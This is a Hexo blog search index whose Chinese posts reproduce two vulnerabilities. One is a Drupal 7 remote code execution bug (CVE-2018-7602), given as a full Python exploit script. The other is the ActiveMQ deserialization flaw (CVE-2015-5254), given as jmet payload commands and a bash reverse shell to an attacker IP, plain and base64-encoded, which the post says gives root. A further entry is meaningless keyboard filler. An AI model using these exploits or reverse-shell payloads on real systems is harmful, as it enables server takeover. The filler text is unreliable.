<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Hexo xiaowu]]></title>
    <url>%2F2019%2F08%2F14%2FHexo-xiaowu%2F</url>
    <content type="text"><![CDATA[fbjqb fljnwqlfgnjwbjgbjw bgf https://s1.51cto.com/images/blog/201908/09/788c4b97b69c87c52c534bbb93a226ed.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk= gehguheqoifjipqjgjwopihgoiw]]></content>
  </entry>
  <entry>
    <title><![CDATA[Drupal 远程代码执行漏洞（CVE-2018-7602）]]></title>
    <url>%2F2019%2F07%2F23%2FDrupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7602%EF%BC%89%2F</url>
    <content type="text"><![CDATA[漏洞复现：1.如下图所示，执行以下命令即可复现该漏洞。示例命令为 id，如图红框中显示，可以执行该命令。 1&quot;id&quot;为要执行的命令 第一个drupal为用户名 第二个drupal为密码 python3 drupa7-CVE-2018-7602.py -c “id” drupal drupal http://ip:8081/ 2.得有CVE-2018-7600的PoC。 1#!/usr/bin/env python3 POCimport requestsimport argparsefrom bs4 import BeautifulSoup def get_args():parser = argparse.ArgumentParser( prog=”drupa7-CVE-2018-7602.py”,formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),epilog= ‘’’This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58using an valid account and poisoning the cancel account form (user_cancel_confirm_form)with the ‘destination’ variable and triggering it with the upload file via ajax (/file/ajax).‘’’) parser.add_argument(“user”, help=”Username”)parser.add_argument(“password”, help=”Password”)parser.add_argument(“target”, help=”URL of target Drupal site (ex: http://target.com/)”)parser.add_argument(“-c”, “–command”, default=”id”, help=”Command to execute (default = id)”)parser.add_argument(“-f”, “–function”, default=”passthru”, help=”Function to use as attack vector (default = passthru)”)parser.add_argument(“-x”, “–proxy”, default=””, help=”Configure a proxy in the format http://127.0.0.1:8080/ (default = none)”)args = parser.parse_args()return args def pwn_target(target, username, password, function, command, proxy):requests.packages.urllib3.disable_warnings()session = requests.Session()proxyConf = {‘http’: proxy, ‘https’: proxy}try:print(‘[_] Creating a session using the provided credential…’)get_params = {‘q’:’user/login’}post_params = {‘form_id’:’user_login’, ‘name’: username, ‘pass’ : password, ‘op’:’Log in’}print(‘[_] Finding User ID…’)session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)get_params = {‘q’:’user’}r = session.get(target, params=get_params, verify=False, proxies=proxyConf)soup = BeautifulSoup(r.text, “html.parser”)user_id = soup.find(‘meta’, {‘property’: ‘foaf:name’}).get(‘about’)if (“?q=” in user_id):user_id = user_id.split(“=”)[1]if(user_id):print(‘[_] User ID found: ‘ + user_id)print(‘[_] Poisoning a form using &#39;destination&#39; and including it in cache.’)get_params = {‘q’: user_id + ‘/cancel’}r = session.get(target, params=get_params, verify=False, proxies=proxyConf)soup = BeautifulSoup(r.text, “html.parser”)form = soup.find(‘form’, {‘id’: ‘user-cancel-confirm-form’})form_token = form.find(‘input’, {‘name’: ‘form_token’}).get(‘value’)get_params = {‘q’: user_id + ‘/cancel’, ‘destination’ : user_id +’/cancel?q[%23post_render][]=’ + function + ‘&amp;q[%23type]=markup&amp;q[%23markup]=’ + command }post_params = {‘form_id’:’user_cancel_confirm_form’,’form_token’: form_token, ‘_triggering_element_name’:’form_id’, ‘op’:’Cancel account’}r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)soup = BeautifulSoup(r.text, “html.parser”)form = soup.find(‘form’, {‘id’: ‘user-cancel-confirm-form’})form_build_id = form.find(‘input’, {‘name’: ‘form_build_id’}).get(‘value’)if form_build_id:print(‘[_] Poisoned form ID: ‘ + form_build_id)print(‘[_] Triggering exploit to execute: ‘ + command)get_params = {‘q’:’file/ajax/actions/cancel/#options/path/‘ + form_build_id}post_params = {‘form_build_id’:form_build_id}r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)parsed_result = r.text.split(‘[{“command”:”settings”‘)[0]print(parsed_result)except:print(“ERROR: Something went wrong.”)raise def main():print ()print (‘===================================================================================’)print (‘| DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602) |’)print (‘| by pimps |’)print (‘===================================================================================\n’) args = get_args() # get the cl argspwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip()) if name == ‘main‘:main()——————————————– ——————————————————————————————————3.然后再执行。]]></content>
      <tags>
        <tag>安装文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ActiveMQ反序列化漏洞(CVE-2015-5254)]]></title>
    <url>%2F2019%2F07%2F21%2FActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2015-5254)%2F</url>
    <content type="text"><![CDATA[1.漏洞介绍：Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程***者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。 2.漏洞利用过程如下： ①构造可执行命令的序列化对象②作为一个消息，发送到目标61616端口③访问web管理页面，读取信息，触发漏洞 3.漏洞复现：1.首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jarmkdir external2.执行命令java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME 靶机的ip 616163.它会给你的ID，访问http://你的ip：8161:8161/admin/queues.jsp4.利用方式也很简单，我们只要将命令换成反弹shell语句再利用就行了。不过在这里我们需要一些小技巧来绕过Java的机制。bash -i &gt;&amp; /dev/tcp/机IP/8888 0&gt;&amp;1 bese64编码把编码放进去。bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}5.然后我们是使用同样的命令将payload发送到61616端口。java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}” -Yp ROME 靶机ip 616166.然后我们查看这条消息，触发命令执行，这时我们在机上监听端口，即可得到shell。7.这就成功进来了，root权限！]]></content>
  </entry>
</search>
